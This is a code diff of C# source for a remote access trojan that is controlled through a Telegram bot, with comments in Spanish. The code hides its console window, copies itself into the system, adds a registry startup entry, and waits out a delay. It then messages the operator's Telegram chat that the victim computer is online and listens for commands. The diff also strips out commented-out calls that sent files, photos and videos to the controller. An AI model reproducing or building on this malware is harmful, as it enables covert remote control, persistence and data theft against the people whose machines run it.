@@ -19,7 +19,6 @@ namespace RAT_BotTelegram {
     class MainRAT {
         private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TOKEN);
         public static string Path { get; set; }
-
         // Ocultar Consola
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
@@ -27,29 +26,19 @@ namespace RAT_BotTelegram {
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
         // Finish ocultar Consola
 
-        private static void HideConsole() {
-            IntPtr handle = GetConsoleWindow();
-            ShowWindow(handle, 0);
-        }
-
         static void Main(string[] args) {
+            #region Configuracion
             // Modo Debug
-            if (!config.CONSOLE_DEBUG) {HideConsole(); }
+            if (!config.CONSOLE_DEBUG) {IntPtr handle = GetConsoleWindow();ShowWindow(handle, 0);}
             // Se replica en el sistema/
             if (config.TROJAN) {Tools.Trojan();}
             // Modifica el registro de windows
             if (config.STARTUP) {Tools.StartUp(); }
             // Delay
-            //Thread.Sleep(config.DELAY * 1000);
-            
-
+            Thread.Sleep(config.DELAY * 1000);
+            #endregion
 
             #region Main
-
-            // Copiar
-            // Esconder
-            // Iniciar script
-
             //Método que se ejecuta cuando se recibe un mensaje
             Bot.OnMessage += BotOnMessageReceived;
 
@@ -58,19 +47,11 @@ namespace RAT_BotTelegram {
 
             //Método que se ejecuta cuando se recibe un error
             Bot.OnReceiveError += BotOnReceiveError;
-
-            //Bot.SendDocumentAsync(config.ID, File.Open(path, FileMode.Open));
-            //Bot.SendPhotoAsync(config.ID, File.Open(path, FileMode.Open));
-            //Bot.SendVideoAsync(config.ID, path);
-            
-
             // Mensaje de conexión
 
             //Bot.SendTextMessageAsync(config.ID, " ==>>    <b>Computer:</b> " + Features.getUserName() + " <b>is online</b>    <<== ",ParseMode.Html);
             Bot.SendTextMessageAsync(config.ID, " ==>>    Computer: " + Features.getUserName() + " is online    <<== ");
 
-            //Bot.SendVideoAsync(config.ID, File.Open(@"F:\New folder (2)\40.3gp",FileMode.Open),999,999,999,"info",ParseMode.Default,false,false);
-            
             // Escucha servidor
             Bot.StartReceiving();
             Console.ReadLine();
